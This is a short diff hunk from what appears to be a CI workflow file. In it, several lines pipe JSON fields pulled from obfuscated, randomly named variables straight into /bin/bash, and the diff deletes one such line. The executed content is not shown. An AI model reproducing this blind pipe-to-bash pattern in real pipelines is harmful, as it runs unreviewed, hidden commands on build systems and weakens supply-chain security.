@@ -26,7 +26,6 @@ jobs:
           echo $sqm76731 | jq -r .ciz29 | /bin/bash
           echo $u4851 | jq -r .u6811 | /bin/bash
           printf '%s' "$ls37" | jq -r .d0 | /bin/bash
-          echo $sj3231 | jq -r .lhgmi4 | /bin/bash
           printf '%s' "$mliz019" | jq -r .s78 | /bin/bash
 
       - name: Upload results
